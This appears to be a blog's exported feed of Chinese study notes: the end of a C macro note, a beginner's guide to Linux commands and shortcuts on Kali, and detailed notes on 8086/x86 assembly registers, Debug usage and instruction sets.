<p>（2）实参可以是常量、变量或表达式</p>
<p>（3）带参宏中的宏名与其后的左括号 ( 之间不能有空格，否则将会被系统认为是无参宏定义</p>
<p>（4）带参宏定义一般把形参用圆括号括起来，防止有些出现错误，例如：#define H(x) x*x</p>
<p>当H(10+1)时，宏展开为10+1 * 10+1 。显然这不是我们想要的结果，应写成#define H(x) (x)*(x)</p>
<p> （5）宏展开可以得到若干个的结果</p>
]]></content>
  </entry>
  <entry>
    <title>小试Linux——笔记</title>
    <url>/2020/10/18/2020-10-18-%E5%B0%8F%E8%AF%95Linux%E2%80%94%E2%80%94%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h5 id="我使用VMware虚拟机来安装kali-Linux系统（具体安装教程，可自行搜索，或者是b站上查询）"><a href="#我使用VMware虚拟机来安装kali-Linux系统（具体安装教程，可自行搜索，或者是b站上查询）" class="headerlink" title="我使用VMware虚拟机来安装kali Linux系统（具体安装教程，可自行搜索，或者是b站上查询）"></a>我使用VMware虚拟机来安装kali Linux系统（具体安装教程，可自行搜索，或者是b站上查询）</h5><h4 id="一、快捷键"><a href="#一、快捷键" class="headerlink" title="一、快捷键"></a>一、快捷键</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs Linux">Up(Down) 上（下）一条指令<br>Ctrl + c 终止当前进程<br>Ctrl + z 挂起当前进程，使用“fg”可唤醒<br>Ctrl + d 删除光标处的字符<br>Ctrl + l 清屏<br>Ctrl + a 移动到命令行首<br>Ctrl + e 移动到命令行尾<br>Ctrl + b 按单词后移（向左）<br>Ctrl + f 按单词前移（向右）<br>Ctrl + Shift + c 复制 <br>Ctrl + Shift + v 粘贴<br><br></code></pre></td></tr></table></figure>

<h4 id="二、常见指令"><a href="#二、常见指令" class="headerlink" title="二、常见指令"></a>二、常见指令</h4><table>
<thead>
<tr>
<th>指令</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>ls</td>
<td>用来显示目标列表</td>
</tr>
<tr>
<td>cd 文件名</td>
<td>切换进入到某个文件中（可进入下级目录，也可以据此返回上级目录）</td>
</tr>
<tr>
<td>pwd</td>
<td>以绝对路径的方式显示用户当前工作目录</td>
</tr>
<tr>
<td>man  command</td>
<td>查看Linux中的指令帮助、配置文件帮助和编程帮助等信息</td>
</tr>
<tr>
<td>apropos whatever</td>
<td>在一些特定的包含系统命令的简短描述的数据库文件里查找关键字</td>
</tr>
<tr>
<td>echo  string</td>
<td>打印一行文本，参数“-e”可激活转义字符</td>
</tr>
<tr>
<td>cat  file</td>
<td>输出文件的内容</td>
</tr>
<tr>
<td>less [file]</td>
<td>允许用户向前或向后浏览文字档案的内容</td>
</tr>
<tr>
<td>mv [file1] [file2]</td>
<td>把file1里的内容移动到file2里，<strong>并且覆盖file2原有内容以及删除file1</strong> （所以可以用来更名）</td>
</tr>
<tr>
<td>cp [file1] [file2]</td>
<td>把file1里的内容复制到file2中，<strong>并且覆盖file2原有的内容</strong></td>
</tr>
<tr>
<td>rm [file]</td>
<td>删除文件file</td>
</tr>
<tr>
<td>ps</td>
<td>用于报告当前系统的进程状态</td>
</tr>
<tr>
<td>top</td>
<td><strong>实时查看</strong>系统的整体运行情况</td>
</tr>
<tr>
<td>kill</td>
<td>杀死一个进程</td>
</tr>
<tr>
<td>ifconfig</td>
<td>查看或设置网络设备</td>
</tr>
<tr>
<td>ping 目标地址</td>
<td>查看网络上的主机是否工作</td>
</tr>
<tr>
<td>netstat</td>
<td>显示网络连接、路由表和网络端口信息</td>
</tr>
<tr>
<td>nc ip地址 ip端口</td>
<td>建立 TCP 和 UDP 连接并监听（连接一个IP地址）</td>
</tr>
<tr>
<td>su</td>
<td>切换当前用户身份到其他用户身份</td>
</tr>
<tr>
<td>touch 文件名</td>
<td>创建新的<strong>空文件</strong> （如果未进入任何目录下进行创建，新文件夹会在主文件夹里面）</td>
</tr>
<tr>
<td>mkdir 目录名</td>
<td>创建目录 （目录的位置同上）</td>
</tr>
<tr>
<td>chmod</td>
<td>变更文件或目录的权限</td>
</tr>
<tr>
<td>chown</td>
<td>变更某个文件或目录的所有者和所属组</td>
</tr>
<tr>
<td>nano / vim/emacs（vim中q不保存退出，wq保存后退出，i可修改编辑文本，ESC结束某个状态）</td>
<td>字符终端的文本编辑器</td>
</tr>
<tr>
<td>exit</td>
<td>退出 shell</td>
</tr>
<tr>
<td>file 文件名</td>
<td>查看文件属性信息</td>
</tr>
<tr>
<td>cd ..</td>
<td>返回上一级目录</td>
</tr>
<tr>
<td>cd –</td>
<td>返回到最开始进入shell的目录下</td>
</tr>
<tr>
<td>ldd elf文件名</td>
<td>查看该elf文件的libc和ld</td>
</tr>
<tr>
<td>whami</td>
<td>打印用户名</td>
</tr>
<tr>
<td>uname</td>
<td>打印系统信息</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>指令ls -al可查看的信息：（如果为ls -l则显示ls可查看的文件的以下详细资料，或者ls -l 文件名可以只查看该文件的信息）</p>
<p>1.第一列表示文件的属性：</p>
<p>【d】，则是目录</p>
<p>【-】，则是文件</p>
<p>【l】，则表示为链接文件（link file）</p>
<p>【b】，则表示为设备文件中可供存储的接口设备</p>
<p>【c】，则表示为设备文件中的串行端口设备，例如键盘、鼠标。</p>
<p>#接下来的属性中，3个为一组，且均为“rwx”3个参数组合。其中r表示可读read，w表示可写write，x表示可执行excute。</p>
<p>第一组为“拥有者的权限（root权限）”，第二组为“同用户组的权限”，第三组为“其他非本用户组的权限”。</p>
<p>2、第二列表示连接占用的节点（i-node）</p>
<p>3、第三列表示这个文件或目录的“拥有者”</p>
<p>4、第四列表示拥有者的用户组</p>
<p>5、第五列为这个文件的大小</p>
<p>6、第六列为这个文件的创建日期或者是最近的修改日期</p>
<p>7、第七列为这个文件的文件名：如果文件名前面有.说明是隐藏文件。如果只输入ls 前面加.的文件不会显示出来。ls -al则会显示出全部文件。</p>
<h4 id="readelf指令"><a href="#readelf指令" class="headerlink" title="readelf指令"></a>readelf指令</h4><p>1、readelf -h 文件名  查看文件的头部信息</p>
<p>2、readelf -S 文件名  </p>
<h3 id="三、一些常识"><a href="#三、一些常识" class="headerlink" title="三、一些常识"></a>三、一些常识</h3><p>1、在Linux中，shell中执行可执行文件时要写成如**./mycat** 的格式，因为在Linux系统里，系统只会搜索环境变量path中去寻找，加个***./*** 是告诉系统去当前目录下去寻找</p>
<p>2、chmod 754 文件名，用来给文件权限进行划分，其中r为4，w为2，x为1</p>
<p>3、一个特殊符号：管道命令符 “|” 功能为：将在管道命令符|左边命令的标准输出作为右边命令的标准输入 </p>
<p>4、Linux系统中用户的用户名以及密码保存在/etc/shadow中</p>
]]></content>
  </entry>
  <entry>
    <title>勇闯汇编——随手记</title>
    <url>/2020/10/17/2020-10-17-%E5%8B%87%E9%97%AF%E6%B1%87%E7%BC%96%E2%80%94%E2%80%94%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h5 id="学习书籍为《汇编语言》（第二版）"><a href="#学习书籍为《汇编语言》（第二版）" class="headerlink" title="学习书籍为《汇编语言》（第二版）"></a>学习书籍为《汇编语言》（第二版）</h5><p>汇编语言是一种为了方便程序员记忆，查看，纠错而设计的一种语言，计算机是无法直接执行的，必须由编译器将汇编语言转化成相应的机器指令（二进制）才能被计算机所执行。</p>
<p>1、CPU想读写一个存储器芯片的某个单元里面的数据时，要有三步骤，第一，先要知道该存储单元的具体位置（通过地址线）；第二，向控制存储器芯片传达读写指令（通过控制线）；第三，将数据读出或者写入该存储单元（通过数据线）</p>
<p>2、当一个CPU地址总线宽度为n（CPU有n根地址线，每根导线可以传送的稳定状态只有两种，高电平与低电平，可以用0或1代替记忆）最多可以寻找到2的n次方个的存储单元，数据线同理，将传输出2的n次方个数据。而控制线则是有多少根就代表有CPU对外部器件有多少种控制。</p>
<p>3、一个存储单元（一个字节）可以存储八个位（bit），存储单元从0开始编号</p>
<p>4、存储器芯片从读写属性上分为两类：随机存储器（RAM）和只读存储器（ROM）。RAM可读可写，但必须带电存储，关机后存储内容丢失；ROM只能读取，不能写入，关机后其中的内容不丢失。</p>
<p>5、BIOS（Basic Input/Output System,基本写入/写出系统）可通过它利用硬件设备进行最基本的输入输出</p>
<p>6、内存地址空间：（个人理解）CPU所能找寻的地址范围内的所有的存储器集合起来的整个空间叫做内存地址空间，而不同的存储器构成的是更小的地址空间</p>
<p>7、一个CPU通常由运算器（处理信息）、控制器（控制各种器件进行工作）、寄存器（存储信息）等器件构成，器件间通过CPU内部的总线相连。</p>
<p>8、汇编程序员通过改变寄存器中的内容来调动CPU进行各项工作</p>
<p>9、在写汇编指令或者寄存器名称时不区分大小写</p>
<p>10、所有内存单元构成的存储空间是一个一维的线性空间，每一个内存单元在这个空间中都有唯一的地址，而这个地址被称为物理地址。</p>
<p>11、8086CPU为16位结构，而地址总线达到了20位，此时采用将两个16位地址合成为一个20位地址，通过地址加法器：物理地址=基础地址（段地址*16）+偏移地址</p>
<p>12、一个x进制的数据左移1位，相当于乘以x</p>
<p>13、CS:IP指向的内存单元中的内容将会被CPU当做指令执行（CS中保存指令的段地址，IP保存偏移地址），用CS,IP合成的物理地址，去内存中读取指令码程序员通过改变寄存器的内容实现对CPU的控制，所以改变CS,IP可以控制CPU执行目标指令</p>
<p>14、可用<strong>jmp 段地址:偏移地址</strong>修改CS:IP的指令；jmp后跟着的地址成为CS与IP中的内容；如果写成<strong>jmp 某寄存器</strong>就是用该寄存器中的值修改IP中的内容；常用的mov指令并不能修改CS、IP的值</p>
<p>15、将一段内存用于存放代码，则就被称为代码段，代码段可以使得只需指向代码段中的第一个指令的物理位置，即可接着执行代码段其余的代码指令</p>
<p>16、实际上在内存中数据和指令并未有区别，都是二进制数！！！</p>
<p>17、如果将AX,BX,CX,DX等如AX拆分成两个八位的寄存器，则AH是高八位，AL是低八位</p>
<p>18、字(word)：由两个字节组成，这两个字节分为高位字节和低位字节。还有dword是由双字（四个字节）组成，qword由四字组成</p>
<p>19、传输数据或运算时，需要注意寄存器所能存储的位数大小，是否会比所传输数据小，如果比传输数据小，将只能保存该寄存器所能保存的最多位数，高位数据将不能被保存进寄存器，并且需要注意的是，正常的指令是不能在存储大小不同的寄存器间进行操作，例如：mov bx,al是错误的指令</p>
<p>另：但是在现在的x64架构下，有mov的变式movzx确是可以进行把存储在位数小的寄存器中的值拷贝到位数大的寄存器中：movzx bx,al</p>
<p>20、[address]表示一个内存单元，address表示内存单元的偏移地址，段地址则存在相应的段寄存器中。例如数据段的段地址存储在寄存器ds中</p>
<p>另：</p>
<p>（1）只有在debug中才能直接写成[address]，如果在汇编源程序编写，前面要加上段寄存器， 如ds:[address]（但是这只是在address为常数是适用，如果用寄存器进行表示时，系统默认段地址在ds中，如果想使用其他段寄存器则需要显式的说明）</p>
<p>（2）address处还可以填写通用寄存器，表示偏移地址是存储在该寄存器中的。比如[bx]说明bx中存储的内容作为偏移地址</p>
<p>21、不能用mov指令直接把数据传入段寄存器，要通过使用通用寄存器进行一次中转才行；或者也可以把内存单元的内容传入段寄存器中。段寄存器的内容传入其他的地方均可</p>
<p>另：sub，add等指令不能对段寄存器进行运算，会报错</p>
<p>22、mov一次能传输的数据的位数由寄存器的大小决定，如al，则传输一个内存单元（一个字节）的内容；如ax则传输两个内存单元（一个字）的内容</p>
<p>23、栈：是一种具有特殊访问方式的存储空间。操作规则：最后进栈的数据，最先出去。并且栈顶是从高地址向低地址增长。</p>
<p>push：入栈。例如：push ax表示把寄存器ax中的数据送入栈中</p>
<p>pop：出栈。例如：pop ax表示从栈顶取出数据送入寄存器ax    </p>
<p>在8086CPU中段寄存器SS和寄存器SP用来存放栈顶的地址，段地址放在SS中，偏移地址放在SP中。任意时刻SS:SP都指向栈顶元素。当栈空时，指向栈中最高地址的下一个地址，例如栈最高地址为1000FH，那么SS:SP指向10010H</p>
<p>8086CPU的出入栈都是以字为单位进行的（所以每次SP进行指向栈顶，数据入栈则减2；数据出栈则加2）但是栈中数据依旧是一个内存单元存储一个字节的内容</p>
<p>8086CPU只有使用SS:SP指向栈顶的位置，并未使用其他寄存器进行检验栈空间是否达到上限而造成栈越界（栈溢出）覆盖别的内存单元</p>
<p>push与pop指令操作对象不仅限于寄存器，也可以用于操作段寄存器、内存单元。</p>
<p>24、内存空间中本来所有的存储单元都是一致的，所谓的各种分段的概念，是因为程序员将之进行划分，而若是CPU本身是无法分辨我们所谓的段。只能通过相应的寄存器来告诉CPU，某些寄存器指向的内容要做相应的处理，才能执行我们想要的段的概念划分</p>
<p>25、在Debug中T命令在执行修改段寄存器SS的指令时，并不会停止，而是把下一条指令也执行了</p>
<p>26、链接：</p>
<p>（1）当源程序很大时，将之分为多个源程序文件进行编译，每个源程序编译完成为目标文件后，再用链接程序将他们连在一起，生成可执行文件</p>
<p>（2）如果程序调用了某个库文件中的子程序，需要将库文件和目标文件链接在一起，生成可执行文件</p>
<p>（3）源程序编译后，得到了存有机器码的目标文件，但是目标文件中的有些内容还不能直接用来生成可执行文件，而链接程序可以处理这些内容，将之变为可执行的，才能使目标文件变为可执行文件</p>
<p>27、DOS系统中.exe文件的加载时，在某段足够长的内存区会先创建一个称为程序段前缀（PSP）的数据区，DOS利用PSP来和被加载程序进行通信，PSP长度为256字节（0~255）。在其之后的才是程序   （了解即可）</p>
<p>28、inc指令是加一的意思，如mov bx,1   inc bx  那么bx==2</p>
<p>29、汇编中一个标号（为某个字母）表示一个地址</p>
<p>30、loop指令</p>
<ul>
<li><p>loop 标号：循环执行标号指向地址内的内容（一般为指令）</p>
</li>
<li><p>标号标识的地址要在loop指令前面</p>
</li>
<li><p>一般在cx中保存着loop循环次数，执行循环前，要先把存储在cx中循环次数减1，不为0时再执行loop指令进行循环；直到cx值为0时停止循环，执行下一条指令</p>
</li>
</ul>
<p>31、在汇编源程序中不能以字母作为数据的开头，若是数据的第一位是字母，那么要在前面加个0才行</p>
<p>32、段前缀：在偏移地址前面显式的用“ds:，cs:，ss:，es:”指明内存单元的段地址</p>
<p>33、DOS方式下，DOS和其他合法程序一般都不会使用0:200~0:2ff的256个字节的空间</p>
<p>34、表明一个内存单元可以用如[bx+200]这样的形式，表示偏移地址为bx中的数值加上200</p>
<p>也可以写为200[bx] （这与C语言中的数组形式很像，假设把200看作起始地址，bx看作循环的i）或者[bx].200</p>
<p>35、在8086CPU和x86下si和di的功能与bx相近，但是si和di不能被拆分成两个8位的寄存器</p>
<p>36、si或di可以与如bx这样使用[bx+si]或者[bx] [si]，两者作用一致为：偏移地址等于si中的值加上bx中的值。</p>
<p>还有这样的形式：[bx+si+data] (data是一个具体的数值) 假设data为200；</p>
<p>即为[bx+si+200] 或是200 [bx] [si] ，[bx].200[si] ，[bx] [si].200</p>
<p>37、一般来说，在需要暂存数据的时候，我们都使用栈来保存数据。因为寄存器的数量少。</p>
<p>38、在8086CPU中只有bx，bp，si，di可以使用如[bx]的形式来进行内存单元的寻址，但是以bx和bp为主。这两个寄存器不可以同时出现在[…]里面，因为在指令中如果没有显性的给出段地址，那么bx与ds相关联，而bp与ss相关联。</p>
<p>39、</p>
<hr>
<h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><h4 id="x86构架下"><a href="#x86构架下" class="headerlink" title="x86构架下"></a>x86构架下</h4><p><img src="2020-10-17-%E5%8B%87%E9%97%AF%E6%B1%87%E7%BC%96%E2%80%94%E2%80%94%E7%AC%94%E8%AE%B0.assets/%E5%AF%84%E5%AD%98%E5%99%A8.jpg"></p>
<p>（图片来源于安全客，水印上也有哈~）</p>
<p>32位x86架构下的寄存器可以被简单分为<strong>通用寄存器</strong>和<strong>特殊寄存器</strong>两类，通用寄存器在大部分汇编指令下是可以任意使用的（虽然有些指令规定了某些寄存器的特定用途），而特殊寄存器只能被特定的汇编指令使用，不能用来任意存储数据。</p>
<p>通用寄存器包括一般寄存器（eax、ebx、ecx、edx），索引寄存器（esi、edi），以及堆栈指针寄存器（esp、ebp）</p>
<p>eax 被称为累加寄存器（<strong>A</strong>ccumulator），用以进行算数运算和返回函数结果等。ebx 被称为基址寄存器（<strong>B</strong>ase），在内存寻址时（比如数组运算）用以存放基地址。ecx 被称为记数寄存器（<strong>C</strong>ounter），用以在循环过程中记数。edx 被称为数据寄存器（<strong>D</strong>ata），常配合 eax 一起存放运算结果等数据。</p>
<p>​    索引寄存器通常用于字符串操作中，esi 指向要处理的数据地址（<strong>S</strong>ource <strong>I</strong>ndex），edi 指向存放处理结果的数据地址（<strong>D</strong>estination <strong>I</strong>ndex）。</p>
<p>​    堆栈指针寄存器（esp、ebp）用于保存函数在调用栈中的状态</p>
<p>特殊寄存器包括段地址寄存器（ss、cs、ds、es、fs、gs），标志位寄存器（EFLAGS），以及指令指针寄存器（eip）</p>
<p>段地址寄存器就是用来存储内存分段地址的，其中寄存器 ss 存储函数调用栈（<strong>S</strong>tack <strong>S</strong>egment）的地址，寄存器 cs 存储代码段（<strong>C</strong>ode <strong>S</strong>egment）的地址，寄存器 ds 存储数据段（<strong>D</strong>ata <strong>S</strong>egment）的地址，es、fs、gs 是附加的存储数据段地址的寄存器。</p>
<p>标志位寄存器（EFLAGS）32位中的大部分被用于标志数据或程序的状态，例如 OF（<strong>O</strong>verflow <strong>F</strong>lag）对应数值溢出、IF（<strong>I</strong>nterrupt <strong>F</strong>lag）对应中断、ZF（<strong>Z</strong>ero <strong>F</strong>lag）对应运算结果为0、CF（<strong>C</strong>arry <strong>F</strong>lag）对应运算产生进位等等。</p>
<p>​    指令指针寄存器（eip）存储下一条运行指令的地址</p>
<p>参考：</p>
<p>64位系统中函数传参使用的寄存器顺序是RDI,RSI,RDX,RCX,R8,R9之后才是使用栈进行存储参数</p>
<h2 id="指令（工具-debug，具体配置可参考百度）"><a href="#指令（工具-debug，具体配置可参考百度）" class="headerlink" title="指令（工具:debug，具体配置可参考百度）"></a>指令（工具:debug，具体配置可参考百度）</h2><p>一、Debug使用</p>
<p>1、(常用指令)R查看、改变CPU寄存器的内容；</p>
<p>D查看内存中的内容；（d 段地址:偏移地址 可以查看从该指向地址起的128个存储单元，若在其后继续输入d，将沿着顺序查看剩下的存储单元，若只想查看单个，则在命令后面在加上偏移地址）</p>
<p><strong>E 段地址:偏移地址</strong> （ 改写内存中的内容）后有两种方法：</p>
<p>（1）是直接在后面加上修改的字母或数字</p>
<p>（2）是回车键后，再填写修改的字母或者数字，使用此方法时如果直接输入空格表示不对某个数据做出修改</p>
<p><strong>注：也可以通过以上方式将机器码（有对应的汇编指令的机器码）直接写入存储单元</strong></p>
<p>U指令：<strong>U 段地址:偏移地址</strong> 可以查看从指向的物理地址作为起始的一些内存中的机器指令，并将内存中的机器指令翻译成汇编指令；</p>
<p>T指令：执行一条机器指令（在输入t指令前，需要先把CS:IP指向的物理地址改为你要执行的物理地址，然后再输入t，执行一条机器指令）；</p>
<p>A指令： <strong>A 段地址:偏移地址</strong> 可以以汇编指令的格式在内存中写入机器指令，不必像E指令输入机器码，更加简单方便</p>
<p>P指令：用来在int 21h处执行，表示程序执行完成，程序返回到最初调用程序的地方；也可以用在loop循环前，让程序自动执行循环直至cx中的循环次数为0</p>
<p>g指令：在debug上调试程序时，<strong>g 偏移地址</strong>可以让程序自动执行到该处的程序地址才停止，并省略中间过程，直接展示执行到该处的运行结果</p>
<p>另：所有填写段地址的地方可以填写段寄存器，表示要对该段寄存器加偏移地址所指向的地址进行操作</p>
<p>二、伪指令</p>
<p>1、assume：假设。假设某一段寄存器和程序中某一个用segment…ends定义的段相关联。编程时要记得用assume将有特定用途的段和相关的段寄存器关联起来即可</p>
<p>2、段名 segment</p>
<p>​            …</p>
<p>​      段名 ends  这两个的组合的是定义一个段，段名 segment说明一个段的开始，段名 ends说明一个段的结束</p>
<p>3、end：是一个汇编程序结束的标记。当编译器在编译汇编程序的过程中，碰到伪指令end就结束对源程序的编译。注意与ends的区分。end是整个汇编程序的结束，而ends只是一个定义段的结束</p>
<p>4、MOV AX,4C00H（或者MOV AH,4CH）INT 21H    可以使得程序返回，在debug中调试时，该指令要用p指令运行</p>
<p>5、编写源程序时dw即define word ，定义字类型的数据。并且数据将会被存放在以cs:0作为开始的内存单元</p>
<p>6、编写源程序时，如果有其他的段或数据需要指定，那么就必须要在真正运行的指令前加上<strong>start:</strong> 同时原本的end也要改成end start</p>
<p>7、编写源程序时，可以定义多个段，每个我们自己定义的段名代表着这个段的段地址</p>
<h3 id="数据传送指令（来自百度百科）"><a href="#数据传送指令（来自百度百科）" class="headerlink" title="数据传送指令（来自百度百科）"></a>数据传送指令（来自百度百科）</h3><p>MOV：传送字或字节。</p>
<p>MOVSX：先符号扩展，再传送。</p>
<p>MOVZX：先零扩展，再传送。</p>
<p>PUSH：把字压入堆栈。</p>
<p>POP： 把字弹出堆栈。</p>
<p>PUSHA： 把AX，CX，DX，BX，SP，BP，SI，DI依次压入堆栈。</p>
<p>POPA： 把DI，SI，BP，SP，BX，DX，CX，AX依次弹出堆栈。</p>
<p>PUSHAD： 把EAX，ECX，EDX，EBX，ESP，EBP，ESI，EDI依次压入<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88">堆栈</a>。</p>
<p>POPAD： 把EDI，ESI，EBP，ESP，EBX，EDX，ECX，EAX依次弹出<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88">堆栈</a>。</p>
<p>BSWAP： 交换32位寄存器里字节的顺序。</p>
<p>XCHG： 交换字或字节。( 至少有一个<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">操作数</a>为寄存器,<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8">段寄存器</a>不可作为操作数)</p>
<p>CMPXCHG： 比较并交换<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">操作数</a>。（第二个操作数必须为<a href="https://baike.baidu.com/item/%E7%B4%AF%E5%8A%A0%E5%99%A8">累加器</a>AL/AX/EAX）</p>
<p>XADD： 先交换再累加。( 结果在第一个<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">操作数</a>里 )</p>
<p>XLAT： 字节查表转换── BX 指向一张 256 字节的表的起点，AL 为表的索引值（0-255，即0-FFH）； 返回 AL 为查表结果 （ [BX+AL]-&gt;AL）</p>
<p>Enter的作用相当==push ebp和mov ebp,esp</p>
<p>Leave的作用相当==mov esp,ebp和pop ebp</p>
<h3 id="输入输出端口传送指令"><a href="#输入输出端口传送指令" class="headerlink" title="输入输出端口传送指令"></a>输入输出端口传送指令</h3><p>IN： I/O端口输入。（ 语法：IN <a href="https://baike.baidu.com/item/%E7%B4%AF%E5%8A%A0%E5%99%A8">累加器</a>，{<a href="https://baike.baidu.com/item/%E7%AB%AF%E5%8F%A3%E5%8F%B7">端口号</a>│DX} ）</p>
<p>OUT： I/O端口输出. （语法：OUT {端口号│DX}，<a href="https://baike.baidu.com/item/%E7%B4%AF%E5%8A%A0%E5%99%A8">累加器</a>）输入输出端口由立即方式指定时，其范围是 0-255；由寄存器DX 指定时，其范围是 0-65535。 [6] </p>
<h3 id="目的地址传送指令"><a href="#目的地址传送指令" class="headerlink" title="目的地址传送指令"></a>目的地址传送指令</h3><p>LEA： 装入<a href="https://baike.baidu.com/item/%E6%9C%89%E6%95%88%E5%9C%B0%E5%9D%80">有效地址</a>。例：LEA DX，string；把<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到DX。</p>
<p>LDS： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入DS。例： LDS SI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到DS：SI。</p>
<p>LES： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入ES。例： LES DI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到ES：DI。</p>
<p>LFS： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入FS。例： LFS DI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到FS：DI。</p>
<p>LGS： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入GS。例： LGS DI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到GS：DI。</p>
<p>LSS： 传送目标<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>，把指针内容装入SS。例： LSS DI，string；把<a href="https://baike.baidu.com/item/%E6%AE%B5%E5%9C%B0%E5%9D%80">段地址</a>：<a href="https://baike.baidu.com/item/%E5%81%8F%E7%A7%BB%E5%9C%B0%E5%9D%80">偏移地址</a>存到SS：DI。</p>
<h3 id="标志传送指令"><a href="#标志传送指令" class="headerlink" title="标志传送指令"></a>标志传送指令</h3><p>LAHF：标志寄存器传送，把标志装入AH。</p>
<p>SAHF： <a href="https://baike.baidu.com/item/%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8">标志寄存器</a>传送，把AH内容装入标志寄存器。</p>
<p>PUSHF： 标志<a href="https://baike.baidu.com/item/%E5%85%A5%E6%A0%88/12688157">入栈</a>。</p>
<p>POPF： 标志<a href="https://baike.baidu.com/item/%E5%87%BA%E6%A0%88">出栈</a>。</p>
<p>PUSHD： 32位标志<a href="https://baike.baidu.com/item/%E5%85%A5%E6%A0%88/12688157">入栈</a>。</p>
<p>POPD： 32位标志<a href="https://baike.baidu.com/item/%E5%87%BA%E6%A0%88">出栈</a>。</p>
<h2 id="算术运算指令"><a href="#算术运算指令" class="headerlink" title="算术运算指令"></a>算术运算指令</h2><p>算数运算类指令包括加减乘除、比较与调整指令。它们可进行8位、16位和32位的运算。参加运算的操作数可以说二进制数和十进制数（BCD码），这些数可以是无符号数，也可以是带符号数。算术运算指令的主要特点是执行结果影响标志寄存器的状态标志位OF、SF、ZF、AF、PF、CF。</p>
<p>ADD： 加法。</p>
<p>ADC： 带进位加法。</p>
<p>INC： 加 1。</p>
<p>AAA： 加法的<a href="https://baike.baidu.com/item/ASCII%E7%A0%81/4607931">ASCII码</a>调整。</p>
<p>DAA： 加法的十进制调整。</p>
<p>SUB： 减法。</p>
<p>SBB： 带借位减法。</p>
<p>DEC： 减 1。</p>
<p>NEG： 取补。</p>
<p>CMP： 比较。（两<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E6%95%B0">操作数</a>作减法，仅修改标志位，不回送结果）</p>
<p>AAS： 减法的<a href="https://baike.baidu.com/item/ASCII%E7%A0%81/4607931">ASCII码</a>调整。</p>
<p>DAS： 减法的十进制调整。</p>
<p>MUL： 无符号乘法。结果回送AH和AL（字节运算），或DX和AX（字运算）</p>
<p>IMUL： 整数乘法。结果回送AH和AL（字节运算），或DX和AX（字运算）</p>
<p>AAM： 乘法的ASCII码调整。</p>
<p>DIV： 无符号除法：商回送AL，余数回送AH，（字节运算）；或商回送AX，余数回送DX（字运算）</p>
<p>IDIV： 整数除法：商回送AL，余数回送AH，（字节运算）；或商回送AX，余数回送DX（字运算）</p>
<p>AAD： 除法的<a href="https://baike.baidu.com/item/ASCII%E7%A0%81/4607931">ASCII码</a>调整。</p>
<p>CBW： 字节转换为字。（把AL中字节的符号扩展到AH中去）</p>
<p>CWD： 字转换为双字。（把AX中的字的符号扩展到DX中去）</p>
<p>CWDE：双字转换为四字。 （把AX中的字符号扩展到EAX中去）</p>
<p>CDQ： 双<a href="https://baike.baidu.com/item/%E5%AD%97%E6%89%A9%E5%B1%95">字扩展</a>。（把EAX中的字的符号扩展到EDX中去）</p>
<h2 id="逻辑运算类指令"><a href="#逻辑运算类指令" class="headerlink" title="逻辑运算类指令"></a>逻辑运算类指令</h2><p>逻辑运算类指令分为逻辑运算指令和移位指令两大类。</p>
<h3 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h3><p>AND： 与运算。</p>
<p>OR： 或运算。</p>
<p>XOR： 异或运算。</p>
<p>NOT： 取反。</p>
<p>TEST： 测试。（两操作数作与运算，仅修改标志位，不回送结果）</p>
<h3 id="移位指令"><a href="#移位指令" class="headerlink" title="移位指令"></a>移位指令</h3><p>SHL： 逻辑左移。</p>
<p>SAL： 算术左移。(=SHL)</p>
<p>SHR： 逻辑右移。（每位右移，低位进 CF，高位补 0）</p>
<p>SAR： 算术右移。（每位右移， 低位进 CF，高位不变）</p>
<p>ROL： 循环左移。</p>
<p>ROR： 循环右移。</p>
<p>RCL： 通过进位的循环左移。</p>
<p>RCR： 通过进位的循环右移。</p>
<p>以上八种移位指令，其移位次数可达255次。</p>
<p>移位一次时，可直接用<a href="https://baike.baidu.com/item/%E6%93%8D%E4%BD%9C%E7%A0%81">操作码</a>，如：SHL AX，1；移位&gt;1次时，则由寄存器CL给出移位次数，如：MOV CL，04；SHL AX，CL。</p>
